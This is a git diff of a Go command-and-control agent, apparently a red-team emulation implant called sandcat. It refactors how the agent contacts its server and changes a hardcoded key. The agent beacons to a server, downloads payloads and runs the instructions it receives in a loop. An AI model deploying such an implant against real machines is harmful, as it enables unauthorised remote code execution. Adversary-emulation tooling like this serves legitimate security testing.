@@ -11,13 +11,13 @@ import (
 	"runtime"
 	"strconv"
 
-	"./api"
+	"./contact"
 	"./execute"
 	"./util"
 )
 
-func askForInstructions(profile map[string]interface{}) {
-	beacon := api.Instructions(profile)
+func askForInstructions(coms contact.Contact, profile map[string]interface{}) {
+	beacon := coms.GetInstructions(profile)
 	if beacon["sleep"] != nil {
 		profile["sleep"] = beacon["sleep"]
 	}
@@ -27,8 +27,8 @@ func askForInstructions(profile map[string]interface{}) {
 			cmd := cmds.Index(i).Elem().String()
 			command := util.Unpack([]byte(cmd))
 			fmt.Printf("[*] Running instruction %.0f\n", command["id"])
-			payloads := api.DropPayloads(command["payload"].(string), profile["server"].(string))
-			go api.ExecuteInstruction(command, profile, payloads)
+			payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string))
+			go coms.RunInstruction(command, profile, payloads)
 			util.Sleep(command["sleep"].(float64))
 		}
 	} else {
@@ -60,14 +60,17 @@ func main() {
 	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
 	group := flag.String("group", "my_group", "Attach a group to this agent")
 	sleep := flag.Int("sleep", 60, "Initial sleep value for sandcat (integer in seconds)")
+	preferredContact := flag.String("contact", "API", "Preferred contact type to the server")
 	flag.Var(&executors, "executors", "Comma separated list of executors (first listed is primary)")
 	flag.Parse()
 	
-	api.Ping(*server)
+	coms, _ := contact.CommunicationChannels[*preferredContact]
+	coms.Ping(*server)
 	profile := buildProfile(*server, *group, *sleep, executors)
+
 	for {
-		askForInstructions(profile)
+		askForInstructions(coms, profile)
 	}
 }
 
-var key = "0Y48ADB3LRO6Q92UBBZERRNXO89OME"
+var key = "ZFCLHQ7SN6Z2JM06CVYZOBFJD8PS28"
